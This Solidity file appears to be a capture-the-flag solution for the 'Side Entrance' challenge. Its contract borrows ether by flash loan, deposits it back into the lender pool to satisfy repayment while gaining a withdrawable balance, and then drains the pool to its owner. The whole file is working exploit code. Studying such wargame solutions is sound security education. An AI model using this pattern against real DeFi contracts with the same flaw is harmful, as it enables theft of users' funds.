pragma solidity 0.8.12;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {SideEntranceLenderPool} from "src/Contracts/side-entrance/SideEntranceLenderPool.sol";
import {Owned} from "solmate/auth/Owned.sol";

contract SideEntranceExploit is Owned {
    using Address for address payable;
    SideEntranceLenderPool internal immutable sideEntranceLenderPool;

    constructor(SideEntranceLenderPool _sideEntranceLenderPool)
        Owned(msg.sender)
    {
        sideEntranceLenderPool = _sideEntranceLenderPool;
    }

    function flashLoan(uint256 _amount) external {
        sideEntranceLenderPool.flashLoan(_amount);
    }

    function execute() external payable {
        //deposit all ether to Lenderpool using deposit function
        sideEntranceLenderPool.deposit{value: address(this).balance}();
    }

    function withdraw() external onlyOwner {
        // withdraw from Lender pool
        sideEntranceLenderPool.withdraw();
        // transfer value to message sender
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
